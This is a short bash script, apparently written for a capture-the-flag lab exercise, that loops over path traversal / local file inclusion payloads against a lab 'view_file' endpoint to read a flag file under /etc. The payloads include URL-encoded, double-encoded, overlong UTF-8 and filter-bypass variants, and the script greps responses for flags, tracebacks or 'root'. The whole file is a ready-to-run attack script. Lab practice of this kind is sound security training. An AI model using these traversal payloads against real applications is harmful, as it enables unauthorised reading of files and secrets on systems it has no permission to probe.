#!/bin/bash

# URL cible
TARGET="http://web0x07.hbtn/task3/view_file"

# Payloads LFI à tester
payloads=(
"../../../../etc/3-flag.txt"
"..%2f..%2f..%2f..%2fetc%2f3-flag.txt"
"..%252f..%252f..%252f..%252fetc%252f3-flag.txt"
"..;/..;/..;/..;/etc/3-flag.txt"
"%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/3-flag.txt"
"..%c1%1c..%c1%1c..%c1%1c..%c1%1c/etc/3-flag.txt"
"..\\..\\..\\..\\etc\\3-flag.txt"
"....//....//....//....//etc//3-flag.txt"
)

# Teste chaque payload
for payload in "${payloads[@]}"; do
  echo "[*] Testing payload: $payload"
  result=$(curl -s "$TARGET?filename=$payload")

  # Détecte la présence d'un flag ou erreur utile
  if echo "$result" | grep -E "FLAG|flag|HTB|404|Traceback|root|bash" >/dev/null; then
    echo -e "\n[+] Potential response found for payload:\n$payload"
    echo "$result" | head -n 30
    echo -e "\n------------------------------------------\n"
  fi
done
